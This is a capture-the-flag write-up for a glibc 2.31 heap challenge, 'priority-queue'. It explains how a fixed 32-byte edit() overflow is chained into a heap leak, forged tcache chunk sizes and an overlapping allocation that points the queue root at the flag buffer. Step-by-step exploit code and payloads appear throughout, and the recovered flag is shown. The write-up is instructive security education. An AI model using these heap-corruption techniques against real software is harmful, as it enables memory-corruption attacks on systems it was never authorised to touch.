# priority-queue

**Category:** Pwn

## Description

> Anything but paying attention during DSA lecture...
>
> `ncat --ssl priority-queue.opus4-7.b01le.rs 8443`

## Overview

This challenge is a heap pwn on glibc 2.31, but the end goal is not code execution. The binary reads the flag into a heap allocation at startup, then exposes a string priority queue with six operations: `insert`, `delete`, `peek`, `edit`, `count`, and `quit`.

The bug is in `edit()`: it always performs a 32-byte `read()` into the current heap minimum (`array[0]`) regardless of how large that allocation actually is. With a 1-byte message, glibc still gives us a minimum-size `0x20` chunk, so only `0x10` bytes are available before we run into the next chunk header. That turns `edit()` into a bounded overwrite of the next chunk metadata.

The final solve uses that overflow twice:

1. First to corrupt the header of the resized queue array and leak a heap pointer through `peek()`.
2. Then to forge the size of a neighboring small chunk so it can be freed into `tcache[0x30]` and reallocated as an overlapping chunk.
3. The overlap lets us overwrite `array[0]` with the address of the startup flag buffer.
4. `peek()` then does the rest for us by calling `puts(array[0])`.

So the whole exploit is really a heap-pointer-redirection attack against an existing read primitive.

## Technical details

### Relevant source behavior

The important parts of the source are:

```c
void insert(void) {
    char buffer[128] = { 0 };
    scanf("%127s", buffer);

    char *chunk = malloc(strlen(buffer) + 1);
    strcpy(chunk, buffer);

    if (capacity == size) {
        int new_capacity = capacity * 2;
        char **new = calloc(new_capacity, sizeof(char *));
        memcpy(new, array, capacity * sizeof(char *));
        free(array);
        array = new;
        capacity = new_capacity;
    }

    array[size] = chunk;
    move_up(size++);
}

void peek(void) {
    puts(array[0]);
}

void edit(void) {
    read(fileno(stdin), array[0], 32);
    move_down(0);
}
```

Three details matter:

1. `insert()` allocates an exact-fit string chunk with `malloc(strlen(buffer) + 1)`.
2. `edit()` always writes 32 bytes into the current root string.
3. `peek()` and `delete()` both print `array[0]` with `puts()`.

That combination gives us both a metadata overwrite and a print sink once we can redirect a queue pointer.

### Why the layout is exploitable

The solve script inserts seven `0x30`-sized strings, then two 1-byte strings:

```python
for i in range(7):
    insert(r, bytes([0x70 + i]) * 0x20)
insert(r, b"b")
insert(r, b"a")
```

This specific ordering is the key.

- The first seven inserts request `0x21` bytes each, which land in the `0x30` size class.
- `insert("b")` becomes a minimum-size `0x20` chunk. Call this chunk `S8`.
- `insert("a")` also becomes a `0x20` chunk. Call this chunk `S9`.
- The ninth insert is also the moment where `size == capacity == 8`, so `insert()` allocates `S9` first and only then resizes the pointer array from 8 entries to 16 entries with `calloc(16, 8)`.

That yields the useful layout:

```text
[flag chunk][old array][7 x 0x30 strings][S8="b" (0x20)][S9="a" (0x20)][A16 array chunk (0x90)]
```

`S9` is the queue root because the heap order is based on `strcmp()` and `"a" < "b" < "p..."`.

Now look at the overflow geometry. A `0x20` chunk gives us only `0x10` bytes before the next chunk header. Since `edit()` writes 32 bytes, the write covers:

```text
16 bytes -> S9 user data
16 bytes -> A16 chunk header
```

That is exactly enough to corrupt the header of the resized array chunk.

### Stage 1: leak a heap pointer through `peek()`

The first `edit()` uses 32 non-NUL bytes:

```python
edit(r, b"a" + b"B" * 31)
leak = peek(r)
s9_ptr = u64(leak[-6:] + b"\x00\x00")
flag_ptr = s9_ptr - 0x230
```

Why this works:

1. `S9` only has `0x10` bytes of user space.
2. The 32-byte write removes the terminating NUL from `S9` and overwrites the entire `A16` header with nonzero bytes.
3. `peek()` calls `puts(array[0])`, so printing starts at `S9` and continues past the old end of the string.
4. After the clobbered header, execution reaches the user data of `A16`, which is the actual pointer array.
5. `A16[0]` is `array[0]`, and at this moment `array[0] == S9`.

So `puts()` prints the little-endian bytes of the `S9` pointer until it hits the first zero byte in the canonical heap address. That gives a direct heap leak.

The exploit then computes:

```python
flag_ptr = s9_ptr - 0x230
```

This offset is not guessed blindly. It comes from the fixed startup allocation order in the provided binary:

1. `main()` allocates the flag buffer first with `malloc(100)`.
2. It then allocates the initial pointer array with `calloc(8, sizeof(char *))`.
3. Only after that do our inserted strings begin.

With the provided binary and glibc, the distance from `S9` back to the flag buffer is stable and equal to `0x230`.

### Stage 2: repair the array chunk and rotate the root

After the leak, `A16`'s metadata is garbage. We need to restore it before asking glibc to do more allocation work.

The next payload is:

```python
restore = b"c\x00".ljust(16, b"R") + p64(0x20) + p64(0x91)
edit(r, restore)
```

This does two things at once.

First, it restores the next chunk header:

- `prev_size = 0x20`, because the previous real chunk is `S9`.
- `size = 0x91`, because `A16` is the 16-entry pointer array, a `0x90` chunk with the `PREV_INUSE` bit set.

Second, it changes `S9`'s string contents from something starting with `"a"` to `"c\0"`. That matters because `edit()` immediately calls `move_down(0)`. Once `S9` becomes `"c"`, `S8` with contents `"b"` becomes lexicographically smaller and is moved to the root.

This is how we switch the editable target from `S9` to `S8` without freeing anything.

### Stage 3: forge `S9` into a `0x30` tcache chunk

Now `S8` is the current root, and `S8` is immediately before `S9` in memory. So another 32-byte edit from `S8` reaches the `S9` header.

The payload is:

```python
forge = b"b\x00".ljust(16, b"F") + p64(0x1337) + p64(0x31)
edit(r, forge)
```

Again the first 16 bytes are just `S8` data. The important part is the next 16 bytes:

- `prev_size = 0x1337` is filler and not used by the exploit.
- `size = 0x31` makes glibc treat `S9` as a valid `0x30` chunk with `PREV_INUSE` set.

The free sequence is then:

```python
delete(r)  # free S8
delete(r)  # free forged-size S9
```

This ordering is required. We cannot free `S9` directly because only the current root is deleted. Freeing `S8` first promotes `S9` to the root, and the second `delete()` frees the forged chunk.

Under the provided glibc 2.31 runtime, the forged `0x31` size is accepted and `S9` is placed in `tcache[0x30]`.

### Stage 4: reclaim the forged chunk and overlap `A16`

The final allocation is:

```python
target = p64(flag_ptr)[:6]
payload = b"z" * 0x20 + target
insert(r, payload)
```

This is chosen so that `malloc(strlen(payload) + 1)` requests a `0x30` chunk and therefore reuses the forged `S9` chunk from `tcache[0x30]`.

The overlap works because the fake `0x30` chunk starting at `S9` covers:

```text
[S9 user data (0x10)][A16 header (0x10)]
```

So when the new payload writes:

```text
0x20 bytes of padding
6 bytes of flag_ptr
```

the padding exactly consumes the forged chunk's full writable area, and the next 6 bytes land at the start of `A16`'s user data, which is `array[0]`.

At that point the queue's root pointer has been replaced with the address of the flag buffer allocated in `main()`.

The final read is trivial:

```python
out = peek(r)
```

Because `peek()` is just `puts(array[0])`, it prints the string stored at `flag_ptr`.

## Proof-of-Concept

**Step 1:** Build the heap layout so the ninth inserted string (`"a"`) is a small root chunk placed immediately before the resized pointer array.

```python
for i in range(7):
    insert(r, bytes([0x70 + i]) * 0x20)
insert(r, b"b")
insert(r, b"a")
```

**Step 2:** Overflow from `S9` into the `A16` header, then use `peek()` to leak the first pointer stored in the resized array.

```python
edit(r, b"a" + b"B" * 31)
leak = peek(r)
s9_ptr = u64(leak[-6:] + b"\x00\x00")
flag_ptr = s9_ptr - 0x230
```

**Step 3:** Restore the corrupted `A16` header and deliberately change the root string from `"a"` to `"c"` so `S8` becomes editable.

```python
restore = b"c\x00".ljust(16, b"R") + p64(0x20) + p64(0x91)
edit(r, restore)
```

**Step 4:** Overflow from `S8` into the `S9` header and forge `S9.size = 0x31`.

```python
forge = b"b\x00".ljust(16, b"F") + p64(0x1337) + p64(0x31)
edit(r, forge)
```

**Step 5:** Free `S8`, then free forged-size `S9` so it enters `tcache[0x30]`.

```python
delete(r)
delete(r)
```

**Step 6:** Request another `0x30` chunk, reclaim forged `S9`, and overwrite `A16[0]` with the flag pointer.

```python
target = p64(flag_ptr)[:6]
payload = b"z" * 0x20 + target
insert(r, payload)
```

**Step 7:** Print the flag by reusing the existing `peek()` functionality.

```python
print(peek(r))
```

Remote result:

```text
bctf{u53_4ft3r_fr33_f4n_v5_0v3rl4pp1n6_4110c4t10n5_3nj0y3r_8c6fd0b452}
```

## P/S

The nicest part of this challenge is that the bug never becomes a traditional arbitrary write or RIP control. The exploit wins by combining three smaller facts:

1. only the root chunk is editable,
2. `move_down(0)` lets us intentionally rotate which chunk is the root,
3. and `puts(array[0])` is already the exact primitive we want once `array[0]` points at the flag.

So the whole solve is about steering heap layout precisely enough that a fixed-size root overflow becomes a pointer swap inside the queue's own storage.
